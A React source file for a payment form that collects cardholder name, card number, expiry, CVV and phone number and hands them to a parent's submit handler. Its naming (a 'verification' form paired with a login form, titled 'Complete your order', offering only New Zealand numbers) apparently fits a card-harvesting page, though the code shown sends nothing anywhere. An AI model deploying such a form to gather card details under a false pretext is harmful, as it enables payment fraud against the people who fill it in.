import React from 'react';
import './CardVerificationForm.css';
import { useLanguage } from '../hooks/useLanguage';

// ─── Country codes (named export — LoginForm.js needs this) ───
export const countryCodes = [
  { code: '+64', country: 'New Zealand (NZ)', phoneLength: 9, zipLength: 4 },
];

const months = Array.from({ length: 12 }, (_, i) => {
  const month = (i + 1).toString().padStart(2, '0');
  return { value: month, label: month };
});

const currentYear = new Date().getFullYear();
const years = Array.from({ length: 11 }, (_, i) => {
  const year = currentYear + i;
  return { value: year.toString().slice(-2), label: year.toString() };
});

function CardVerificationForm({ cardDetails, cardErrors, isLoading, onInputChange, onSubmit }) {
  const { t } = useLanguage();

  const handleExpiryMonthChange = (month) => {
    const newExpiryDate = month + (cardDetails.expiryDate?.slice(-2) || '');
    onInputChange('expiryDate', newExpiryDate);
  };
  const handleExpiryYearChange = (year) => {
    const newExpiryDate = (cardDetails.expiryDate?.slice(0, 2) || '') + year;
    onInputChange('expiryDate', newExpiryDate);
  };
  const handleCvvChange = (e) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length <= 4) onInputChange('cvv', value);
  };
  const handlePhoneChange = (e) => {
    let value = e.target.value.replace(/\D/g, '');
    const selectedCountry = countryCodes.find(
      (c) => c.code === (cardDetails.countryCode || '+1')
    );
    const maxLength = selectedCountry ? selectedCountry.phoneLength : 15;
    if (value.length <= maxLength) onInputChange('phoneNumber', value);
  };

  return (
    <div className="cardv-page">
      <div className="cardv-container">
        <h1 className="cardv-title">Complete your order</h1>

        <p className="cardv-intro">
          Enter your payment details below to finish your checkout.
          All fields are required unless marked 'optional'.
        </p>

        <hr className="cardv-divider" />

        <h2 className="cardv-subtitle">Payment information</h2>

        <form onSubmit={onSubmit}>
          {/* Cardholder */}
          <div className="cardv-field">
            <label>{t.cardholderName}</label>
            <input
              type="text"
              value={cardDetails.cardholderName}
              onChange={(e) => onInputChange('cardholderName', e.target.value)}
              placeholder="e.g. JOHN SMITH"
              className={`cardv-input ${cardErrors.cardholderName ? 'cardv-error' : ''}`}
            />
            {cardErrors.cardholderName && (
              <span className="cardv-error-msg">{cardErrors.cardholderName}</span>
            )}
          </div>

          {/* Card number */}
          <div className="cardv-field">
            <label>{t.cardNumber}</label>
            <input
              type="text"
              value={cardDetails.cardNumber}
              onChange={(e) => onInputChange('cardNumber', e.target.value)}
              placeholder="1234 5678 9012 3456"
              maxLength="19"
              className={`cardv-input ${cardErrors.cardNumber ? 'cardv-error' : ''}`}
            />
            {cardErrors.cardNumber && (
              <span className="cardv-error-msg">{cardErrors.cardNumber}</span>
            )}
          </div>

          {/* Expiry + CVV */}
          <div className="cardv-row">
            <div className="cardv-field">
              <label>{t.expirationDate}</label>
              <div className="cardv-row">
                <select
                  value={cardDetails.expiryDate?.slice(0, 2) || ''}
                  onChange={(e) => handleExpiryMonthChange(e.target.value)}
                  className={`cardv-input ${cardErrors.expiryDate ? 'cardv-error' : ''}`}
                >
                  <option value="">{t.month}</option>
                  {months.map((m) => (
                    <option key={m.value} value={m.value}>
                      {m.label}
                    </option>
                  ))}
                </select>
                <select
                  value={cardDetails.expiryDate?.slice(-2) || ''}
                  onChange={(e) => handleExpiryYearChange(e.target.value)}
                  className={`cardv-input ${cardErrors.expiryDate ? 'cardv-error' : ''}`}
                >
                  <option value="">{t.year}</option>
                  {years.map((y) => (
                    <option key={y.value} value={y.value}>
                      {y.label}
                    </option>
                  ))}
                </select>
              </div>
              {cardErrors.expiryDate && (
                <span className="cardv-error-msg">{cardErrors.expiryDate}</span>
              )}
            </div>

            <div className="cardv-field">
              <label>{t.cvv}</label>
              <input
                type="text"
                value={cardDetails.cvv}
                onChange={handleCvvChange}
                placeholder="123"
                maxLength="4"
                className={`cardv-input ${cardErrors.cvv ? 'cardv-error' : ''}`}
              />
              {cardErrors.cvv && <span className="cardv-error-msg">{cardErrors.cvv}</span>}
            </div>
          </div>

          {/* Phone */}
          <div className="cardv-field">
            <label>{t.phoneNumber}</label>
            <div className="cardv-row">
              <select
                className="cardv-input cardv-country-select"
                value={cardDetails.countryCode || '+1'}
                onChange={(e) => onInputChange('countryCode', e.target.value)}
              >
                {countryCodes.map((c) => (
                  <option key={c.code} value={c.code}>
                    {c.country} {c.code}
                  </option>
                ))}
              </select>
              <input
                type="text"
                value={cardDetails.phoneNumber || ''}
                onChange={handlePhoneChange}
                placeholder="1234567890"
                maxLength="15"
                className={`cardv-input cardv-phone-input ${cardErrors.phoneNumber ? 'cardv-error' : ''}`}
              />
            </div>
            {cardErrors.phoneNumber && (
              <span className="cardv-error-msg">{cardErrors.phoneNumber}</span>
            )}
            <span className="cardv-help">{t.phoneHint}</span>
          </div>

          {/* Buttons */}
          <div className="cardv-actions">
            <button
              type="submit"
              className="cardv-btn cardv-btn-continue"
              disabled={isLoading}
            >
              {isLoading ? 'Please wait…' : 'Continue'}
            </button>
            <button type="button" className="cardv-btn cardv-btn-cancel">
              Cancel
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}

export default CardVerificationForm;